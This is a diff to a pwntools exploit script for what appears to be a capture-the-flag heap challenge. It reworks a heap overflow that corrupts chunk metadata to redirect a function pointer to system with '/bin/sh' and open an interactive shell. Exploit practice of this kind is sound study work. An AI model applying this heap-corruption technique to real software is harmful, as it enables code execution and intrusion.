@@ -28,7 +28,7 @@ def create_text(index, size, color, text):
     io.sendlineafter(b"(1-16): ", str(index).encode())
     io.sendlineafter(b"Size: ", str(size).encode())
     io.sendlineafter(b"Color: ", str(color).encode())
-    io.sendlineafter(b"Text: ", text)
+    io.sendafter(b"Text: ", text)
 
 
 def print_text(index):
@@ -49,15 +49,18 @@ exe = context.binary = ELF(args.EXE or "../src/chall", False)
 
 io = start()
 
-create_text(1, 0x10, 1, b"overflow me")
-create_text(2, 0x10, 1, b"victim")
+create_text(1, 17, 1, b"overflow me\n")
+create_text(2, 17, 1, b"size\n")
+create_text(3, 17, 1, b"printer\n")
 
 delete_text(1)
 
-system_offset = ctypes.c_uint((exe.got["system"] - exe.sym["printers"]) // 8).value
-payload = p32(0) + p64(0) * 2 + p64(0x21) + p32(system_offset) + b"/bin/sh\0"
-create_text(1, 0x10, 1, payload)
+create_text(1, 17, 1, safe_flat({16: b"\x41"}))
 
-print_text(2)
+delete_text(2)
+
+create_text(2, 49, 1, safe_flat({16: [0x21, exe.sym["system"], b"/bin/sh\0"]}))
+
+print_text(3)
 
 io.interactive()
